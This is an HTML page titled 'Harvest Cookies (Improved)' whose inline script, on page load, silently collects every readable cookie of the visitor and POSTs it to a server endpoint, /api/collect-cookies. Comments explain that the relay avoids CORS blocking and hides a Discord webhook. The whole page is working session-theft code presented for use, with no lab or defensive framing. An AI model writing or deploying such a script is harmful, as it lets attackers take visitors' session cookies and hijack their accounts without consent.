<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Harvest Cookies (Improved)</title>
</head>
<body>
  <h1>Harvesting Cookies (Improved)</h1>

  <script>
    // 1) HttpOnly cookies are never exposed to JS — you can only grab non‑HttpOnly via document.cookie.
    // 2) Instead of POSTing directly to Discord (which will be blocked by CORS and exposes your webhook),
    //    we proxy through our own server endpoint at /api/collect-cookies.
    // 3) Split on the FIRST '=' so values containing '=' or ';' aren’t mangled.
    function getCookies() {
      return document.cookie
        .split('; ')
        .reduce((acc, pair) => {
          const idx = pair.indexOf('=');
          if (idx < 0) return acc;
          const name = pair.slice(0, idx);
          const val  = pair.slice(idx + 1);
          acc[name] = decodeURIComponent(val);
          return acc;
        }, {});
    }

    async function harvestAndSend() {
      const cookies = getCookies();
      // (HttpOnly cookies won’t show up here)
      try {
        const res = await fetch('/api/collect-cookies', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ cookies })
        });
        if (res.ok) {
          console.log('✅ Cookies relayed to server');
        } else {
          console.warn('⚠️ Server responded with', res.status);
        }
      } catch (err) {
        console.error('❌ Error sending cookies:', err);
      }
    }

    window.addEventListener('load', harvestAndSend);
  </script>
</body>
</html>
